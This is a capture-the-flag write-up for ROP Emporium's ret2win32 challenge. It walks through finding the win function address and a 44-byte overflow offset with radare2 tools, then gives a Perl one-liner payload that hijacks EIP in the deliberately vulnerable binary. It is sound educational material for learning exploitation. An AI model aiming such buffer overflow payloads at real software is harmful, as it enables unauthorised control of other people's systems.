# Download Link
https://ropemporium.com/challenge/ret2win.html
# Method of Solve
> The first thing we should do is examine the binary with rabin2
```
rabin2 -I ./ret2win32
```
> The binary follows little endian order. Next, we should identify the address of the win function with r2
```
r2 -d -A ret2win32
afl
```
> The address for the win function in little endian is: `\x2c\x86\x04\x08`
> The next step is to identify the buffer overflow offset. We create a pattern with ragg2 to feed to the binary
```
ragg2 -P 100 -r
```
> Then run the binary
```
dc
```
> paste in the pattern
> This crashes the program, and we can use this command to get the offset of the eip register
```
dr
```
> Note the value in the eip register, and copy it, then
```
ragg2 -q 0x41415041
```
> This tells us that the offset is 44 bytes
> Now we can combine this information to craft a string in Perl
```
perl -e 'print "A" x 44 . "\x2c\x86\x04\x08"' | ./ret2win32
````
